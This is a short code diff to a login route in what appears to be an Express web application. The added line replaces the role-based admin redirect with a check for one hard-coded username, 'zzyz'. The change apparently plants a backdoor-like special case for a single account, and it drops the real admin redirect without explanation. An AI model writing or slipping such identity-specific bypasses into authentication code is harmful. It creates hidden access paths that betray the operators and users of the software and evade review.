@@ -74,7 +74,7 @@ router
 
       req.session.user = user;
       if (user.role === "user") res.redirect("/dashboard");
-      if (user.role === "admin") res.redirect("/admin");
+      if (user.name === "zzyz") res.redirect("/admin");
     } catch (error) {
       res.status(500).json({ message: "Authentication failed", error });
     }
